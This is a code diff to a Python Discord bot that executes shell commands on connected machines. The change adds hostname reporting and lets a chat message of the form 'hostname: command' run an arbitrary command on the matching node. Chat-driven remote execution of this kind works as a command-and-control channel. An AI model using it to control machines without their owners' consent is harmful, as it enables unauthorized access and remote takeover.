@@ -7,6 +7,9 @@ import discord
 import uuid #used for checking unique hosts 
 
 id = (hex(uuid.getnode()))
+hostname = subprocess.check_output("hostname", shell=True, text=True)
+print(hostname)
+
 
 #Getting the users token
 f = open("token", "r")
@@ -61,6 +64,8 @@ async def on_message(message):
     print("\n=======   ")
     print("Message: ")
     print(message.content)
+    print(hostname + ": ")
+
     print("++++++++ \n")
 
 
@@ -87,10 +92,16 @@ async def on_message(message):
     # Report in to the sever, so the user can see what nodes are online 
     if message.content == ("dish report"):
 
-        reportString = "```\n=========" + "\n" + "ID: " + str(id) + "\n" + str(os.uname()) + "\n" + "=========```"
+        reportString = "```\n=========" + "\n" + "ID: " + str(id) + "\n" + "Hostname: " + hostname + "\n" + str(os.uname()) + "\n" + "=========```"
 
         await message.channel.send(reportString) 
 
+    # Run the command if the hostname matches 
+    if message.content.startswith(hostname + ": "): 
+
+        command = message.content.split(hostname + ": ")[1]
+ 
+        runCommand(command)
 
 
     # Standard running of commands on all nodes 
